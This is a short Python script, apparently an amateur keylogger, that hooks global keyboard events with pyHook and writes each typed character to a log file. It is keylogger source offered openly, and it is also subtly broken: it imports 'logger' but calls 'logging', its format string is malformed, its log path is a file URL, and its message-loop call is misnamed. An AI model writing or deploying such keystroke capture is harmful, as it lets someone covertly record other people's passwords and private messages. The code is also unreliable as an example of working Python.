import pyHook
import pythoncom
import sys
import logger

file_log = "file:///media/fuse/crostini_d27fecb205a476a3dcbc1f054693de8cbe4cb51c_termina_penguin/test.html"

def OnKeyboardEvent(event):
    logging.basicConfig(filename=file_log, level=logging.DEBUG, format="% (message)s")
    chr(event.ASCII)
    logging.log(10, chr(event.ASCII))
    return True

hooks_manager = pyHook.HookManager()
hooks_manager.KeyDown = OnKeyboardEvent
hooks_manager.HookKeyboard()
pythoncom.PumpMessage()